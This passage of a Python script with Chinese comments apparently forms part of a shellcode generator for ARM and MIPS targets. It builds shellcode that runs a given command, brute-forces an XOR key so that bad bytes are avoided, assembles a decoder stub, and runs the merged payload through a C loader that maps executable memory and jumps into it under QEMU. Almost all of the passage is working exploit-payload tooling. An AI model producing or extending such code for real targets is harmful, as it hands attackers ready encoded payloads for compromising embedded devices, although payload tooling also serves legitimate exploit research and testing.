                for f in [tmp_s_path, tmp_o_path, tmp_bin_path]:
                    if os.path.exists(f):
                        os.remove(f)

    def xorencoder(self):
        """
        暴力搜索一个能生成不含坏字节 payload 的密钥，并对 shellcode 进行编码。
        """
        print("[*] 开始寻找安全的 XOR 密钥...")
        print(f"    -- 检查目标: 仅编码后的 payload")
        print(f"    -- 定义的坏字节: {[hex(b) for b in self.bad_bytes]}")

        # 计算填充和循环次数
        padding_needed = (4 - len(self.raw_shellcode) % 4) % 4
        padded_len = len(self.raw_shellcode) + padding_needed
        self.loop_count = padded_len // 4

        print("[*] 密钥搜索已启动...")
        max_attempts = 200000
        for attempt in range(max_attempts):
            if (attempt + 1) % 50000 == 0:
                print(f"    -- 仍在搜索... (已尝试 {attempt + 1}/{max_attempts} 次)")

            key = random.randint(1, 0xFFFFFFFF)

            # 只执行一项检查：编码后的 payload 是否干净
            encoded_payload = self._internal_xorencode(key, self.raw_shellcode)
            if any(b in self.bad_bytes for b in encoded_payload):
                continue

            # --- 成功找到 ---
            print(f"\n✅ 成功！在 {attempt + 1} 次尝试后找到可用方案。")
            print(f"[*] 找到安全密钥: {hex(key)}")

            self.key = key
            self.encoded_shellcode = encoded_payload

            print("\n[*] 编码后的 Shellcode (Python 格式):")
            print_as_python_bytes(self.encoded_shellcode)
            return

        raise RuntimeError(f"在 {max_attempts} 次尝试后仍未找到能生成干净 payload 的密钥。")

    def xordecoder(self):
        """
        使用找到的密钥和循环次数生成解码器存根。
        【注意】此函数不检查生成的解码器是否包含坏字节。
        """
        print("\n[*] 正在生成解码器...")
        key_loader_asm = self._get_safe_value_loader('r1', self.key)
        count_loader_asm = self._get_safe_value_loader('r2', self.loop_count)
        decoder_asm = self.DECODER_TEMPLATE_ARM.format(
            key_loader=key_loader_asm,
            count_loader=count_loader_asm
        )
        self.decoder_stub = self._compile(decoder_asm)
        print("[*] 生成的解码器 (Python 格式):")
        print_as_python_bytes(self.decoder_stub)

    def merged_shellcode(self):
        """
        将解码器和编码后的 payload 拼接成最终的 shellcode。
        """
        self.final_shellcode = self.decoder_stub + self.encoded_shellcode
        print("\n[*] 已将解码器和 payload 合并。")

    def validate_shellcode(self):
        """
        [新增] 通过 QEMU user-mode 动态编译并执行最终的 shellcode 以进行验证。
        """
        print("\n[*] 开始验证生成的 Shellcode...")
        # 检查依赖
        if not shutil.which(f"{config['ARM_TOOLCHAIN_PATH']}gcc"):
            print("[!] 警告: 未找到 'arm-linux-gnueabi-gcc'。跳过验证。")
            return
        if not shutil.which("qemu-arm"):
            print("[!] 警告: 未找到 'qemu-arm'。跳过验证。")
            return

        # [修正] 验证最终生成的 shellcode，而不是原始的 shellcode
        c_shellcode = ", ".join([f"0x{b:02x}" for b in self.final_shellcode])

        # C 语言加载器模板
        c_loader_code = f"""
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

unsigned char shellcode[] = {{ {c_shellcode} }};

int main(void) {{
    void *mem = mmap(NULL, sizeof(shellcode),
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (mem == MAP_FAILED) {{
        perror("mmap");
        return 1;
    }}
    memcpy(mem, shellcode, sizeof(shellcode));
    printf("[+] Shellcode 已加载到内存，准备跳转...\\n\\n");
    fflush(stdout);
    ((void (*)(void))mem)();
    return 0;
}}
"""
        # 定义临时文件路径
        c_file_path = os.path.join(config["shellcode_directory"], "arm_verify_shellcode.c")
        elf_file_path = os.path.join(config["shellcode_directory"], "arm_verify_shellcode")

        try:
            # 写入 C 文件
            with open(c_file_path, "w") as f:
                f.write(c_loader_code)
            print(f"    -- 已生成 C 语言加载器: {c_file_path}")

            # 编译 C 文件
            subprocess.run([
                f"{config['ARM_TOOLCHAIN_PATH']}gcc",
                "-o", elf_file_path,
                c_file_path,
                "-static"  # 静态链接对于 QEMU user-mode 很重要
            ], check=True, capture_output=True)

            # 使用 QEMU 执行
            print("------ QEMU 输出开始 ------")
            result = subprocess.run(["qemu-arm", elf_file_path], capture_output=True, text=True)
            print(result.stdout)
            if result.stderr:
                print("--- stderr ---")
                print(result.stderr)
            print("------ QEMU 输出结束 ------\n")

            if result.returncode == 0:
                print("✅ 验证成功: Shellcode 似乎已成功执行 (QEMU 返回值为 0)。")
            else:
                print(f"[!] 验证警告: Shellcode 执行后 QEMU 返回非零值 ({result.returncode})。可能表示执行中出现问题。")

        except subprocess.CalledProcessError as e:
            print(f"\n[!!!] 验证失败: 编译 C 加载器时出错。")
            print(f"--- (stderr) ---\n{e.stderr.decode('utf-8', errors='ignore')}--------------------")
        finally:
            if not self.save_files:
                for f in [c_file_path, elf_file_path]:
                    if os.path.exists(f):
                        os.remove(f)

    def _internal_xorencode(self, key, data_to_encode):
        """
        内部辅助函数：使用给定的密钥对数据进行 XOR 编码。
        """
        # 使用一个不含坏字节的 ARM NOP 指令 (mov r1, r1 -> e1a01001) 作为填充
        arm_nop = b'\x01\x10\xa0\xe1'
        padding_needed = (4 - len(data_to_encode) % 4) % 4

        padded_data = data_to_encode + (arm_nop * (padding_needed // 4))

        encoded_buffer = bytearray()
        for i in range(0, len(padded_data), 4):
            chunk = padded_data[i:i + 4]
            dword = int.from_bytes(chunk, 'little')
            xored_dword = (dword ^ key).to_bytes(4, 'little')
            encoded_buffer.extend(xored_dword)
        return bytes(encoded_buffer)

    def _get_safe_value_loader(self, register, value):
        if value < 256:
            # 使用 mov 指令，避免 ldr，因为 ldr 可能会从 .pool 加载数据，引入坏字节
            return f"mov {register}, #{value}\n"
        if value < 0x10000:
            return f"movw {register}, #{value}\n"

        lower16 = value & 0xFFFF
        upper16 = (value >> 16) & 0xFFFF
        instr = f"movw {register}, #{lower16}\n"
        if upper16 != 0:
            instr += f"movt {register}, #{upper16}\n"
        return instr

    def _compile(self, asm_code):
        """
        [重构] 只编译汇编代码，不进行坏字节检查。
        """
        tmp_s_path = os.path.join(config["shellcode_directory"], "arm_xor_decoder.s")
        tmp_o_path = os.path.join(config["shellcode_directory"], "arm_xor_decoder.o")
        tmp_bin_path = os.path.join(config["shellcode_directory"], "arm_xor_decoder.bin")
        with open(tmp_s_path, "w") as f:
            f.write(asm_code)
        try:
            # [重构] 移除 -mthumb 参数，使用默认的 ARM 模式
            cmd = [f"{config['ARM_TOOLCHAIN_PATH']}as", "-march=armv7-a", "-o", tmp_o_path, tmp_s_path]
            subprocess.run(cmd, check=True, capture_output=True)

            subprocess.run(
                [f"{config['ARM_TOOLCHAIN_PATH']}objcopy", "-O", "binary", "-j", ".text", tmp_o_path, tmp_bin_path],
                check=True, capture_output=True)
            with open(tmp_bin_path, "rb") as f:
                binary_code = f.read()
            return binary_code
        except subprocess.CalledProcessError as e:
            print(
                f"\n[!!!] 汇编失败! 来自 'as' 的错误信息:\n--- (stderr) ---\n{e.stderr.decode('utf-8', errors='ignore')}--------------------")
            return b''
        finally:
            if not self.save_files:
                for f in [tmp_s_path, tmp_o_path, tmp_bin_path]:
                    if os.path.exists(f): os.remove(f)


def armtest():
    # [重构] 参数改为固定值，不再使用 argparse
    command = 'id'
    bad_bytes = ['00']
    save_files = True
    validate = True  # 设置为 True 来默认执行验证

    try:
        bad_bytes_int = [int(b, 16) for b in bad_bytes]

        # [重构] 将 command 直接传递给构造函数
        encoder = arm(command, bad_bytes=bad_bytes_int, save_files=save_files, validate=validate)
        print_as_python_bytes(encoder.final_shellcode)
        encoder.validate_shellcode()
        print("-" * 60)

    except (FileNotFoundError, ValueError, RuntimeError) as e:
        print(f"\n[!!!] 程序出错: {e}")


def main():
    # --- 使用 argparse 解析命令行参数 ---
    parser = argparse.ArgumentParser(
        description="为一个命令生成 ARM 或 MIPS 架构的 shellcode。",
        formatter_class=argparse.RawTextHelpFormatter  # 保持帮助文本格式
    )
    parser.add_argument("-arch", "--arch", choices=['arm', 'mips'], help="目标CPU架构 (arm 或 mips)")
    parser.add_argument("-e", "--endian", choices=['big', 'little'], help="shellcode 字节序 (big 或 little)")
    parser.add_argument("-cmd", "--cmd", help="要执行的命令")
    parser.add_argument("-xor", "--xor_encode", action="store_true", help="对shellcode进行XOR编码")
    parser.add_argument("-v", "--verify", action="store_true", help="编译运行验证shellcode")
    parser.add_argument("-sf", "--save_file", action="store_true", help="保存中间文件")
    parser.add_argument("-s", "--sleep", action="store_true", help="在shellcode前面加上睡眠指令,default 3秒")
    parser.add_argument("-l", "--long_shellcode", action="store_true", help="生成长shellcode")

    args = parser.parse_args()

    if args.arch == "mips":
        if args.endian == "little":
            print(f"🔴 info: 使用小端字节序 (little-endian) 编码 shellcode。")
            config[
                'MIPS_TOOLCHAIN_PATH'] = f"/{current_user}/mips32el--glibc--stable-2024.05-1/bin/mipsel-buildroot-linux-gnu-"
            config['qemu_path'] = "qemu-mipsel-static"
        else:
            config[
                'MIPS_TOOLCHAIN_PATH'] = f"/{current_user}/mips32--glibc--stable-2024.05-1/bin/mips-buildroot-linux-gnu-"
            config['qemu_path'] = "qemu-mips-static"
            print(f"🔵 info: 使用大端字节序 (big-endian) 编码 shellcode。")
    else:
        if args.endian == "little":
            print(f"🔴 info: 使用小端字节序 (little-endian) 编码 shellcode。")
            config[
                'ARM_TOOLCHAIN_PATH'] = f"/{current_user}/armv7-eabihf--uclibc--stable-2024.05-1/bin/arm-buildroot-linux-uclibcgnueabihf-"
            config['qemu_path'] = "qemu-arm-static"
        else:
            config[
                'ARM_TOOLCHAIN_PATH'] = f"/{current_user}/armv7-eabihf--uclibc--stable-2024.05-1/bin/arm-buildroot-linux-uclibcgnueabihf-"
            print(f"🔵 info: 使用大端字节序 (big-endian) 编码 shellcode。")
            config['qemu_path'] = "qemu-arm-static"
    armtest()

    sys.exit(0)

    # --- 1. 环境检查 ---
    check_toolschain()
    # --- 2. 生成原始shellcode ---
    raw_shellcode_get = None
    if args.cmd:
        # ---2.1 生成短shellcode---(汇编模板)
        if not args.long_shellcode:
            raw_shellcode = MipsShellcodeGenerator(args.cmd, args.save_file)
        # ---2.2 生成长shellcode---(C + 汇编模板)
        else:
            print(f"[+] 正在为架构 '{args.arch}' 生成命令 '{args.cmd}' 的 shellcode...")
            raw_shellcode = MipsShellcodeGenerator_long(args.cmd, args.arch, args.save_file)
        raw_shellcode_get = raw_shellcode.raw_shellcode
        if raw_shellcode:
            # 以 \xde\xad\xbe\xef 的格式打印shellcode
            print("   -- Shellcode 生成成功(长度: " + str(len(raw_shellcode_get)) + " 字节):")
            print(''.join(f'\\x{b:02x}' for b in raw_shellcode_get))
            # print(raw_shellcode.xxd_bin_file.stdout)
            # print_as_c_string(raw_shellcode_get)
            print("-" * 30)
        else:
            print("\n[-] Shellcode 生成失败。请检查编译器路径和错误输出。")

    # --- 3. 对 shellcode 进行 XOR 编码 ---
    if args.xor_encode:
        if args.sleep:
            sleep = Sleep()
            raw_shellcode_get = (sleep.Sleep_shellcode + raw_shellcode_get)
        else:
            raw_shellcode_get = raw_shellcode_get
        xor_encoder = XorEncoder(raw_shellcode_get, endian=args.endian)
        print("    -- xor编码后的shellcode (长度: " + str(len(xor_encoder.xor_encoded_shellcode)) + " 字节):")
        print_as_python_bytes(xor_encoder.xor_encoded_shellcode)
        key = xor_encoder.key
        loop_count = len(xor_encoder.xor_encoded_shellcode) // 4
        val_for_loop_count = -(loop_count + 1)

        # --- 4. 生成解码器 ---
        print(
            f"[+] 正在为密钥 '{hex(xor_encoder.key)}' 和长度 '{len(xor_encoder.xor_encoded_shellcode)}' 生成MIPS解码器...")
        xor_decoder = XorDecoder(xor_encoder.xor_encoded_shellcode, key, args.save_file)
        print(
            f"    -- 解码器生成成功，密钥: {hex(xor_decoder.key)}，循环次数: {loop_count}，循环次数值: {val_for_loop_count}")
        print(f"    -- 解码器shellcode (长度 {str(len(xor_decoder.xor_decoded_shellcode))} 字节):")
        # --- 5. 打印解码器shellcode ---
        print_as_python_bytes(xor_decoder.xor_decoded_shellcode)
        print("-" * 30)
        # 调用方法生成解码器
        if xor_decoder and xor_encoder:
            merged_shellcode = xor_decoder.xor_decoded_shellcode + xor_encoder.xor_encoded_shellcode
            print_len = f"[+] xor解码器长度({str(len(xor_decoder.xor_decoded_shellcode))}字节) + xor编码后的shellcode长度({str(len(xor_encoder.xor_encoded_shellcode))}字节) = {str(len(merged_shellcode))} 字节"
    else:
        merged_shellcode = raw_shellcode_get
        print_len = f"[+] 原始shellcode长度({str(len(raw_shellcode_get))}字节)"
    print(print_len)
    print_as_python_bytes(merged_shellcode)
    if args.verify:
        # xor解码器+xor编码后的shellcode合并测试
        CTestHarnessGenerator(merged_shellcode)


if __name__ == "__main__":
    main()
